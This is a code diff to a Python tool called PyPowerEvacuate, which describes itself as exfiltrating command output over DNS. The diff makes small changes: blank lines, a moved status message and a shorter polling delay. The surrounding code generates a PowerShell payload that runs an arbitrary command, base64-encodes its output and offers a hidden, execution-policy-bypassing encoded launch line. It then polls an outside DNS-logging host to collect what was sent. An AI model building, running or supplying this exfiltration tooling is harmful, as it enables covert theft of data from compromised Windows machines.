@@ -9,6 +9,7 @@ from time import sleep
 import warnings; warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 print('[#] PyPowerEvacuate')
+
 parser = argparse.ArgumentParser(description="[-] PyPowerEvacuate is a tool that allows you to exfiltrate command output over DNS.")
 parser.add_argument('-c', required=True, default=None, help='Set your command.')
 args = vars(parser.parse_args())
@@ -21,6 +22,7 @@ def generateDomain():
     token = response['token']
     return domainName, key, token
 
+
 def generateCommand(domain, command):
     payload = f'$command = Invoke-Expression "{command}"; [string]$encodeCommand = $command; $encodedCommand=[' \
            'Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encodeCommand)); $encodedCommand = ' \
@@ -32,13 +34,14 @@ def generateCommand(domain, command):
     print(f'\n[-] Payload 1: {payload}')
     print(f'\n[-] Payload 2: powershell -NoP -NonI -W Hidden -Exec Bypass -e ' + base64.b64encode(payload.encode('utf16')[2:]).decode()+'\n')
 
+
 def getOutput(token):
     outputs = []
+    print('[*] Waiting for request ...')
     while True:
         response = requests.get(f'https://log.xn--9tr.com/{token}', verify=False).json()
         if response == None:
-            print('[*] Waiting for request ...')
-            sleep(15)
+            sleep(5)
             continue
         else:
             print(f"[-] You got requests.")
@@ -69,6 +72,5 @@ def main():
     print('[*] Choose one of these payloads.')
     generateCommand(domain, args['c'])
     getOutput(token)
-    
 if __name__ == '__main__':
     main()
